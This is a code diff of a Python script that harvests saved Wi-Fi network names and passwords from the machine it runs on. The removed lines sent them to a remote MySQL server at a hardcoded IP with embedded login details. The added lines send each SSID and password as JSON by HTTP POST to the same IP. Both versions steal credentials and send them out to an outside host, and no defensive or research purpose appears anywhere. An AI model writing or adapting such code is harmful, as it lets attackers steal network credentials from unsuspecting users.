@@ -6,11 +6,11 @@ import subprocess
 import re
 from threading import Thread
 import time
-import mysql.connector
 import os
 from tkinter import messagebox
 import ctypes
-from mysql.connector import Error
+import requests
+import json
 
 COMPLIENCE = {}
 
@@ -55,27 +55,25 @@ def main():
         profiles = get_profiles()
         get_passwords(profiles)
 
+        jsons = []
+        for key, value in COMPLIENCE.items():
+            dict = {
+                'ssid': key,
+                'password': value
+            }
+            js = json.dumps(dict)
+            print(js)
+            jsons.append(js)
+
         try:
-            connect = mysql.connector.connect(
-                host='185.92.74.31',
-                user='Gonna_Destroy',
-                password='zaqxsw123',
-                database='wifi',
-                charset='utf8mb4',
-                collation='utf8mb4_unicode_ci',
-                auth_plugin = 'mysql_native_password'
-            )
-
-            cursor = connect.cursor()
-
-            for key, value in COMPLIENCE.items():
-                cursor.execute('INSERT INTO users (ssid, passwd) VALUES (%s,%s) ', (key, value))
-                connect.commit()
-
-                cursor.close()
-                connect.cursor()
-        except Error as e:
-            print(e)
+            url = 'http://185.92.74.31:10000'
+            headers = {'Content-Type': 'application/json'}
+            for js in jsons:
+                answer = requests.post(url=url, headers=headers, json=js)
+                time.sleep(0.3)
+                print(answer.status_code)
+        except requests.exceptions as rec:
+            print(rec)
 
 
 colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]
